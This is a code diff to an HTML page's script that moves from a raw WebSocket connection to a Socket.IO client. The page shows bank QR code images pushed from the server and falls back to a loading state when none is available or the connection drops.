@@ -212,35 +212,28 @@
         </div>
     </div>
 
+    <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = new WebSocket('wss://web-production-c116.up.railway.app');
+        const socket = io();
         const qrDisplay = document.getElementById('qrDisplay');
-        const loadingContainer = document.querySelector('.loading-container');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const displayId = '98721311';
 
-        socket.onopen = () => {
-            console.log('Connected to server');
-        };
-
-        socket.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'qr') {
-                console.log('Received QR code from bank:', data.bank);
-                qrDisplay.src = data.qrData;
+        socket.on('new_qr', (qrData) => {
+            if (qrData && qrData !== '') {
+                qrDisplay.src = qrData;
                 qrDisplay.style.display = 'block';
                 loadingContainer.style.display = 'none';
+            } else {
+                qrDisplay.style.display = 'none';
+                loadingContainer.style.display = 'flex';
             }
-        };
+        });
 
-        socket.onerror = (error) => {
-            console.error('WebSocket error:', error);
-        };
-
-        socket.onclose = () => {
-            console.log('Disconnected from server');
-            setTimeout(() => {
-                window.location.reload();
-            }, 5000);
-        };
+        socket.on('disconnect', () => {
+            qrDisplay.style.display = 'none';
+            loadingContainer.style.display = 'flex';
+        });
     </script>
 </body>
 </html> 
